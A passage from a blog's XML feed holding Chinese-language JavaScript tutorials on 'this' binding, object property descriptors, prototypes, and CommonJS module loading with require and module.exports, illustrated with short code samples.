class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = 2;</span><br><span class="line"></span><br><span class="line">foo.call( null ); // 2</span><br></pre></td></tr></table></figure><blockquote><p>更安全的 this</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function foo(a,b) &#123;</span><br><span class="line">console.log( &quot;a:&quot; + a + &quot;, b:&quot; + b );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 我们的 DMZ 空对象</span><br><span class="line">var ø = Object.create( null );</span><br><span class="line"></span><br><span class="line">// 将数组散开作为参数</span><br><span class="line">foo.apply( ø, [2, 3] ); // a:2, b:3</span><br><span class="line"></span><br><span class="line">// 用 `bind(..)` 进行 currying</span><br><span class="line">var bar = foo.bind( ø, 2 );</span><br><span class="line">bar( 3 ); // a:2, b:3</span><br></pre></td></tr></table></figure><p>可以通过让其指向一个空对象，使其按照<code>硬绑定</code>原则进行</p><h4 id="间接"><a href="#间接" class="headerlink" title="间接"></a>间接</h4><p>通过赋值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = 2;</span><br><span class="line">var o = &#123; a: 3, foo: foo &#125;;</span><br><span class="line">var p = &#123; a: 4 &#125;;</span><br><span class="line"></span><br><span class="line">o.foo(); // 3</span><br><span class="line">(p.foo = o.foo)(); // 2</span><br></pre></td></tr></table></figure><h3 id="词法this"><a href="#词法this" class="headerlink" title="词法this"></a>词法this</h3><blockquote><p>一个箭头函数的词法绑定是不能被覆盖</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">  // 返回一个箭头函数</span><br><span class="line">return (a) =&gt; &#123;</span><br><span class="line">    // 这里的 `this` 是词法上从 `foo()` 采用的</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj1 = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var obj2 = &#123;</span><br><span class="line">a: 3</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var bar = foo.call( obj1 );</span><br><span class="line">bar.call( obj2 ); // 2, 不是3!</span><br></pre></td></tr></table></figure><blockquote><p>它们本质是使用广为人知的词法作用域来禁止了传统的 <code>this</code> 机制</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">var self = this; // 词法上捕获 `this`</span><br><span class="line">setTimeout( function()&#123;</span><br><span class="line">console.log( self.a );</span><br><span class="line">&#125;, 100 );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">foo.call( obj ); // 2</span><br></pre></td></tr></table></figure><h2 id="二、对象"><a href="#二、对象" class="headerlink" title="二、对象"></a>二、对象</h2><p>前面我们讲解了 this 绑定如何根据函数调用的调用点指向不同的对象。但究竟什么是对象，为什么我们需要指向它们？</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p class="tip">对象来自于两种形式：声明（字面）形式，和构造形式。</p><blockquote><p>一个对象的字面语法看起来像这样：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var myObj = &#123;</span><br><span class="line">key: value</span><br><span class="line">// ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>构造形式看起来像这样：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var myObj = new Object();</span><br><span class="line">myObj.key = value;</span><br></pre></td></tr></table></figure><p>构造形式和字面形式的结果是完全同种类的对象。唯一真正的区别在于你可以向字面声明一次性添加一个或多个键/值对，而对于构造形式，你必须一个一个地添加属性。</p><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><blockquote><p>JS 的六种主要类型</p></blockquote><ul><li>string</li><li>number</li><li>boolean</li><li>null</li><li>undefined</li><li>object</li></ul><blockquote><p>内建对象</p></blockquote><ul><li>String</li><li>Number</li><li>Boolean</li><li>Object</li><li>Function</li><li>Array</li><li>Date</li><li>RegExp</li><li>Error</li></ul><h3 id="基本字面量"><a href="#基本字面量" class="headerlink" title="基本字面量"></a>基本字面量</h3><p>在JavaScript中基本字面量会转换成对象</p><p class="tip">一般来说，我们通过基本字面量：<code>let str = &#39;hello world&#39;;</code>创建的字符串，他只是个基本类型按道理来说不存在属性，但通过<code>str.length</code>却可以轻松渠道str字符串的长度，这是怎么回事呢，原来JavaScript会将<strong>字面量形式的str</strong>，转变成<code>String</code>对象形式的字符串</p><blockquote><p>基本字面量转变成对象的类型</p></blockquote><ul><li>String</li><li>Number</li><li>Boolean</li><li>RegExp</li></ul><blockquote><p>深浅拷贝</p></blockquote><p>在进行深浅拷贝前，我们先明确，基本数据类型和复杂类型赋值的不同：</p><ul><li>在我们进行赋值操作的时候，基本数据类型的赋值（=）是在内存中新开辟一段栈内存，然后再把再将值赋值到新的栈中</li><li>但是引用类型的赋值是传址。只是改变指针的指向，例如，也就是说引用类型的赋值是对象保存在栈中的地址的赋值，这样的话两个变量就指向同一个对象，因此两者之间操作互相有影响</li></ul><blockquote><p>赋值（=）和浅拷贝的区别</p></blockquote><p>浅复制只会将对象的各个属性进行依次复制，并不会进行递归复制，而 JavaScript 存储对象都是存地址的，所以浅复制会导致赋值后的对象属性指向同一个内存地址</p><h3 id="属性描述符"><a href="#属性描述符" class="headerlink" title="属性描述符"></a>属性描述符</h3><blockquote><p>获取对象属性性质</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.getOwnPropertyDescriptor( myObject, &quot;a&quot; );</span><br><span class="line">// &#123;</span><br><span class="line">//    value: 2,</span><br><span class="line">//    writable: true,</span><br><span class="line">//    enumerable: true,</span><br><span class="line">//    configurable: true</span><br><span class="line">// &#125;</span><br></pre></td></tr></table></figure><blockquote><p>明确定义一个属性</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">Object.defineProperty( myObject, &quot;a&quot;, &#123;</span><br><span class="line">value: 2,</span><br><span class="line">writable: true,</span><br><span class="line">configurable: true,</span><br><span class="line">enumerable: true</span><br><span class="line">&#125; );</span><br><span class="line"></span><br><span class="line">myObject.a; // 2</span><br></pre></td></tr></table></figure><p class="tip">使用 defineProperty(..)，我们手动、明确地在 myObject 上添加了一个直白的，普通的 a 属性。然而，你通常不会使用这种手动方法，除非你想要把描述符的某个性质修改为不同的值。</p><blockquote><p>修改属性性质</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;</span><br><span class="line">    a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.defineProperty( myObject, &quot;a&quot;, &#123;</span><br><span class="line">value: 2, </span><br><span class="line">writable: true,</span><br><span class="line">configurable: true,</span><br><span class="line">enumerable: true </span><br><span class="line">&#125; );</span><br></pre></td></tr></table></figure><ul><li>value<ul><li>默认值：设置的初始值</li></ul></li><li>writable<ul><li>可修改性</li><li>默认值：true</li><li>将属性设置true后，修改属性值，将会发生<code>TypeError</code>(如果你试图改变一个不可配置属性的描述符定义，就会发生 TypeError)</li></ul></li><li>configurable<ul><li>可配置性</li><li>能否通过defineProperty重新定义特性</li><li>设置false后无法，更改特性</li><li>默认值：true</li><li>阻止的另外一个事情是使用 delete 操作符移除既存属性的能力</li></ul></li><li>enumerable<ul><li>可遍历性</li><li>默认值：true</li></ul></li></ul><h3 id="设置对象的几个方法"><a href="#设置对象的几个方法" class="headerlink" title="设置对象的几个方法"></a>设置对象的几个方法</h3><h4 id="防止扩展-Prevent-Extensions"><a href="#防止扩展-Prevent-Extensions" class="headerlink" title="防止扩展(Prevent Extensions)"></a>防止扩展(Prevent Extensions)</h4><p><code>Object.preventExtensions(..)</code></p><p class="tip">不能添加新的属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.preventExtensions( myObject );</span><br><span class="line"></span><br><span class="line">myObject.b = 3;</span><br><span class="line">myObject.b; // undefined</span><br></pre></td></tr></table></figure><h4 id="封印（Seal）"><a href="#封印（Seal）" class="headerlink" title="封印（Seal）"></a>封印（Seal）</h4><p><code>Object.Seal(..)</code></p><p class="tip">它实质上在当前的对象上调用 Object.preventExtensions(..)、并且属性标记为 configurable:false</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var myObject = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Object.Seal( myObject );</span><br></pre></td></tr></table></figure><h4 id="冻结（Freeze）"><a href="#冻结（Freeze）" class="headerlink" title="冻结（Freeze）"></a>冻结（Freeze）</h4><p><code>Object.freeze(..)</code></p><p class="tip">Object.freeze(..) 创建一个冻结的对象，这意味着它实质上在当前的对象上调用 Object.seal(..)，同时也将它所有的“数据访问”属性设置为 writable:false，所以它们的值不可改变。</p><h3 id="混合（淆）“类”的对象"><a href="#混合（淆）“类”的对象" class="headerlink" title="混合（淆）“类”的对象"></a>混合（淆）“类”的对象</h3><p>在JavaScript中是否存在一般语言类似于Java、C++类的概念，而JavaScript中的原型又是什么东西呢</p><p class="tip">在JavaScript中类并不是我们想象中的类，JavaScript还是基于原型的概念进行设计，尽管它看起来存在：<code>new</code>、<code>instanceof</code>这些让你以为它是类的东西</p><p>在开始了解前，我们先明白什么是类？</p><p>类是一种事物的抽象，拿建汽车来说，汽车需要：</p><ul><li>轮胎</li><li>发动机</li><li>后视镜等等…</li></ul><p>我们通过对汽车事物进行抽象，通过实例化产生新的汽车</p><p>并且类还包含继承、多态等概念：同样允许父类的泛化行为被子类覆盖，从而使它更加具体。实际上，相对多态允许我们在覆盖行为中引用基础行为</p><p>类的实例化上就是一个拷贝的过程，如下图：</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190408_13k6cb57lifabic37gi0889i67250_253x333.png" alt=""></p><blockquote><p>JavaScript中的”类”</p></blockquote><p class="tip">当你“继承”或是“实例化”时，JavaScript 的对象机制不会 自动地 执行拷贝行为。很简单，在 JavaScript 中没有“类”可以拿来实例化，只有对象。而且对象也不会被拷贝到另一个对象中，而是被 链接在一起</p><p>在其他语言中观察到的类的行为意味着拷贝，让我们来看看 JS 开发者如何在 JavaScript 中 模拟 这种 缺失 的类的拷贝行为：mixins（混合）。我们会看到两种“mixin”：明确的（explicit） 和 隐含的（implicit）</p><h2 id="三、原型（Prototype）"><a href="#三、原型（Prototype）" class="headerlink" title="三、原型（Prototype）"></a>三、原型（Prototype）</h2><h3 id="Object-prototype"><a href="#Object-prototype" class="headerlink" title="Object.prototype"></a>Object.prototype</h3><p>每个 普通 的 [[Prototype]] 链的最顶端，是内建的 Object.prototype。这个对象包含各种在整个 JS 中被使用的共通工具，因为 JavaScript 中所有普通（内建，而非被宿主环境扩展的）的对象都“衍生自”（也就是，使它们的 [[Prototype]] 顶端为）Object.prototype 对象。</p><p>你会在这里发现一些你可能很熟悉的工具，比如 .toString() 和 .valueOf()</p><h3 id="设置与遮蔽属性"><a href="#设置与遮蔽属性" class="headerlink" title="设置与遮蔽属性"></a>设置与遮蔽属性</h3><p>如果给一个对象添加属性，而这个属性或方法已经在其<code>[[Prototype]]</code>上已存在，这时是否会展现出”多态”特性，子属性</p><p>让我们来看下面的实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myObject.foo = &quot;bar&quot;;</span><br></pre></td></tr></table></figure><p>正如我们被暗示的那样，在 myObject 上的 foo 遮蔽没有看起来那么简单。我们现在来考察 myObject.foo = “bar” 赋值的三种场景，当 foo 不直接存在 于 myObject，但 存在 于 myObject 的 [[Prototype]] 链的更高层时：</p><ul><li>如果一个普通的名为 foo 的数据访问属性在 [[Prototype]] 链的高层某处被找到，而且没有被标记为只读（writable:false），那么一个名为 foo 的新属性就直接添加到 myObject 上，形成一个 遮蔽属性。</li><li>如果一个 foo 在 [[Prototype]] 链的高层某处被找到，但是它被标记为 只读（writable:false） ，那么设置既存属性和在 myObject 上创建遮蔽属性都是 不允许 的。如果代码运行在 strict mode 下，一个错误会被抛出。否则，这个设置属性值的操作会被无声地忽略。不论怎样，没有发生遮蔽。</li><li>如果一个 foo 在 [[Prototype]] 链的高层某处被找到。没有 foo 会被添加到（也就是遮蔽在）myObject 上。<strong>必须使用 Object.defineProperty(..)</strong></li></ul><h3 id="“类”"><a href="#“类”" class="headerlink" title="“类”"></a>“类”</h3><p>现在你可能会想知道：“为什么 一个对象需要链到另一个对象？” 真正的好处是什么？这是一个很恰当的问题，但在我们能够完全理解和体味它是什么和如何有用之前，我们必须首先理解 [[Prototype]] 不是 什么。</p><p>在 JavaScript 中，对于对象来说没有抽象模式/蓝图，即没有面向类的语言中那样的称为类的东西。JavaScript 只有 对象。</p><p>实际上，在所有语言中，JavaScript 几乎是独一无二的，也许是唯一的可以被称为“面向对象”的语言，因为可以根本没有类而直接创建对象的语言很少，而 JavaScript 就是其中之一。</p><p>在 JavaScript 中，类不能（因为根本不存在）描述对象可以做什么。对象直接定义它自己的行为。这里 仅有 对象。</p><h3 id="“类”函数"><a href="#“类”函数" class="headerlink" title="“类”函数"></a>“类”函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">// ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = new Foo();</span><br><span class="line"></span><br><span class="line">Object.getPrototypeOf( a ) === Foo.prototype; // true</span><br></pre></td></tr></table></figure><p>在面向类的语言中，可以制造一个类的多个 拷贝（即“实例”），就像从模具中冲压出某些东西一样。我们在第四章中看到，这是因为初始化（或者继承）类的处理意味着，“将行为计划从这个类拷贝到物理对象中”，对于每个新实例这都会发生。</p><p>但是在 JavaScript 中，没有这样的拷贝处理发生。你不会创建类的多个实例。你可以创建多个对象，它们的 [[Prototype]] 连接至一个共通对象。但默认地，没有拷贝发生，如此这些对象彼此间最终不会完全分离和切断关系，而是 链接在一起。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>当试图在一个对象上进行属性访问，而对象又没有该属性时，对象内部的 [[Prototype]] 链接定义了 [[Get]] 操作（见第三章）下一步应当到哪里寻找它。这种对象到对象的串行链接定义了对象的“原形链”（和嵌套的作用域链有些相似），在解析属性时发挥作用。</p><p>所有普通的对象用内建的 Object.prototype 作为原形链的顶端（就像作用域查询的顶端是全局作用域），如果属性没能在链条的前面任何地方找到，属性解析就会在这里停止。toString()，valueOf()，和其他几种共同工具都存在于这个 Object.prototype 对象上，这解释了语言中所有的对象是如何能够访问他们的。</p><p>在 JavaScript 中的关键区别是，没有拷贝发生。取而代之的是对象最终通过 [[Prototype]] 链链接在一起。</p><p class="tip">当一个属性/方法引用在一个对象上发生，而这样的属性/方法又不存在时，这个链接就会被使用。在这种情况下，[[Prototype]] 链接告诉引擎去那个被链接的对象上寻找该属性/方法。接下来，如果那个对象也不能满足查询，就沿着它的 [[Prototype]] 查询，如此继续。这种对象间的一系列链接构成了所谓的“原形链”。<br></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、this关键词&quot;&gt;&lt;a href=&quot;#一、this关键词&quot; class=&quot;headerlink&quot; title=&quot;一、this关键词&quot;&gt;&lt;/a&gt;一、this关键词&lt;/h2&gt;&lt;p class=&quot;tip&quot;&gt;this是关键词，表示指向的索引位置&lt;/p&gt;

&lt;p&gt;很多人对于this最终指向常见的误解是，this是编写时绑定的，通常会将其认为成一下几种情况：&lt;/p&gt;
&lt;p&gt;1、认为this指向，foo函数&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;foo&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;foo();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>前端模块化</title>
    <link href="http://zhoushaw.github.io/2019/03/27/learning/font-end/js/module/"/>
    <id>http://zhoushaw.github.io/2019/03/27/learning/font-end/js/module/</id>
    <published>2019-03-27T03:43:35.000Z</published>
    <updated>2019-04-23T15:16:05.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在学习新一个东西前，最好的办法是了解它能给我们带来什么好处我们为什么学习它，从而激发学习兴趣，哈哈哈~又扯了一堆，下面进入我们前端模块化探索之旅吧。</p><blockquote><p>模块化的历史</p></blockquote><p>在正式进入模块化学习前我们来了解一下前端模块化的前生今世。</p><div><a id="more"></a></div><p>这里我就不过多赘述了，可以参考玉伯大佬的<a href="https://github.com/seajs/seajs/issues/547" target="_blank" rel="noopener">前端模块化开发的价值</a></p><blockquote><p>模块化规范</p></blockquote><p>现有模块化标准：</p><ul><li>CommonJS</li><li>AMD</li><li>CMD</li><li>ES6</li></ul><h2 id="浏览器加载脚本"><a href="#浏览器加载脚本" class="headerlink" title="浏览器加载脚本"></a>浏览器加载脚本</h2><blockquote><p>传统方法</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 页面内嵌的脚本 --&gt;</span><br><span class="line">&lt;script type=&quot;application/javascript&quot;&gt;</span><br><span class="line">  // module code</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 外部脚本 --&gt;</span><br><span class="line">&lt;script type=&quot;application/javascript&quot; src=&quot;path/to/myModule.js&quot;&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>默认情况下，浏览器是同步加载 JavaScript 脚本，即渲染引擎遇到<code>&lt;script&gt;</code>标签就会停下来，等到执行完脚本，再继续向下渲染。如果是外部脚本，还必须加入脚本下载的时间。</p><p>如果脚本体积很大，下载和执行的时间就会很长，因此造成浏览器堵塞，用户会感觉到浏览器“卡死”了，没有任何响应。这显然是很不好的体验，所以浏览器允许脚本异步加载，下面就是两种异步加载的语法。</p><ul><li>defer是“渲染完再执行”</li><li>async是“下载完就执行”</li></ul><h2 id="CommonJS"><a href="#CommonJS" class="headerlink" title="CommonJS"></a>CommonJS</h2><p><strong>Node.js是commonJS规范的主要实践者</strong>，它有四个重要的环境变量为模块化的实现提供支持：<strong>module</strong>、<strong>exports</strong>、<strong>require</strong>、<strong>global</strong>。实际使用时，用<strong>module.exports</strong>定义当前模块对外输出的接口（不推荐直接用<strong>exports</strong>），用<strong>require</strong>加载模块。</p><p>每个文件就是一个模块，有自己的作用域。在一个文件里面定义的变量、函数、类，都是私有的，对其他文件不可见。</p><h3 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// example.js</span><br><span class="line">var x = 5;</span><br><span class="line">var addX = function (value) &#123;</span><br><span class="line">  return value + x;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>上面代码中，变量x和函数addX，是当前文件example.js私有的，其他文件不可见。</strong></p><h3 id="global对象"><a href="#global对象" class="headerlink" title="global对象"></a>global对象</h3><p>如果想在多个文件分享变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">global.__ENV__ = dev;</span><br></pre></td></tr></table></figure><p>上面代码的<strong>ENV</strong>变量，可以被所有文件读取。当然，需要尽量避免定义全局属性</p><h3 id="导出模块"><a href="#导出模块" class="headerlink" title="导出模块"></a>导出模块</h3><p>CommonJS规范规定，每个模块内部，<strong>module</strong>变量代表当前模块。这个变量是一个对象，它的<strong>exports</strong>属性（即<strong>module.exports</strong>）是对外的接口。加载某个模块，其实是加载该模块的<strong>module.exports</strong>属性。</p><p>为了方便，Node为每个模块提供一个exports变量，指向module.exports。这等同在每个模块头部，有一行这样的命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var exports = module.exports;</span><br></pre></td></tr></table></figure><p>在对外输出模块接口时，可以向<strong>exports</strong>对象添加方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exports.area = function (r) &#123;</span><br><span class="line">  return Math.PI * r * r;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">exports.circumference = function (r) &#123;</span><br><span class="line">  return 2 * Math.PI * r;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>注意，不能直接将exports变量指向一个值，因为这样等于切断了exports与module.exports的联系。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exports = function(x) &#123;console.log(x)&#125;;</span><br></pre></td></tr></table></figure><p>这意味着，如果一个模块的对外接口，就是一个单一的值，不能使用exports输出，只能使用module.exports输出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exports.hello = function() &#123;</span><br><span class="line">  return &apos;hello&apos;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">module.exports = &apos;Hello world&apos;;</span><br></pre></td></tr></table></figure><p>下面代码中，hello函数是无法对外输出的，因为module.exports被重新赋值了</p><h3 id="引入模块"><a href="#引入模块" class="headerlink" title="引入模块"></a>引入模块</h3><p>Node使用CommonJS模块规范，内置的<strong>require</strong>命令用于加载模块文件。</p><p>require命令的基本功能是，<strong>读入并执行一个JavaScript文件</strong>，然后返回<strong>该模块的exports对象</strong>。如果没有发现指定模块，会报错。</p><blockquote><p>特性</p></blockquote><p>commonJS用同步的方式加载模块。在服务端，模块文件都存在本地磁盘，读取非常快，所以这样做不会有问题。但是在浏览器端，限于网络原因，更合理的方案是使用异步加载。</p><blockquote><p>导入模块</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// math.js</span><br><span class="line">var basicNum = 0;</span><br><span class="line">function add(a, b) &#123;</span><br><span class="line">  return a + b;</span><br><span class="line">&#125;</span><br><span class="line">module.exports = &#123; //在这里写上需要向外暴露的函数、变量</span><br><span class="line">  add: add,</span><br><span class="line">  basicNum: basicNum</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// index.js</span><br><span class="line">var math = require(&apos;./math&apos;);</span><br><span class="line">//&#123;</span><br><span class="line">//    add: [Function],</span><br><span class="line">//    basicNum: 0</span><br><span class="line">//&#125;</span><br></pre></td></tr></table></figure><blockquote><p>加载规则</p></blockquote><ol><li><p>如果参数字符串以“/”开头，则表示加载的是一个位于绝对路径的模块文件。比如，require(‘/home/marco/foo.js’)将加载/home/marco/foo.js。</p></li><li><p>如果参数字符串以“./”开头，则表示加载的是一个位于相对路径（跟当前执行脚本的位置相比）的模块文件。比如，require(‘./circle’)将加载当前脚本同一目录的circle.js。</p></li><li><p>如果参数字符串不以“./“或”/“开头，而且是一个路径，比如require(‘example-module/path/to/file’)，则将先找到example-module的位置，然后再以它为参数，找到后续路径。</p></li><li><p>如果指定的模块文件没有发现，Node会尝试为文件名添加.js、.json、.node后，再去搜索。.js件会以文本格式的JavaScript脚本文件解析，.json文件会以JSON格式的文本文件解析，.node文件会以编译后的二进制文件解析。</p></li><li><p>如果想得到require命令加载的确切文件名，使用require.resolve()方法。</p></li><li><p>如果参数字符串不以“./“或”/“开头，则表示加载的是一个默认提供的核心模块（位于Node的系统安装目录中），或者一个位于各级node_modules目录的已安装模块（全局安装或局部安装）。</p></li></ol><p>举例来说，脚本/home/user/projects/foo.js执行了require(‘bar.js’)命令，Node会依次搜索以下文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/node/bar.js</span><br><span class="line">/home/user/projects/node_modules/bar.js</span><br><span class="line">/home/user/node_modules/bar.js</span><br><span class="line">/home/node_modules/bar.js</span><br><span class="line">/node_modules/bar.js</span><br></pre></td></tr></table></figure><blockquote><p>引入</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 